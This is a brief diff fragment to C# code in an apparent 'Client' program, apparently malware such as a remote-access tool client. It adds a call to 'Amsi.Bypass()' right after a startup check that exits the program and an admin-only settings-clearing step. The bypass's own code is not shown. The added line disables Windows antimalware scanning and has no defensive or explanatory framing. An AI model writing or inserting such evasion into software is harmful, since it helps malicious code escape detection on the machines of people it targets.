@@ -32,6 +32,7 @@ namespace Client
                     Environment.Exit(0);
                 if (Methods.IsAdmin())
                     Methods.ClearSetting();
+                Amsi.Bypass();
 
 
 
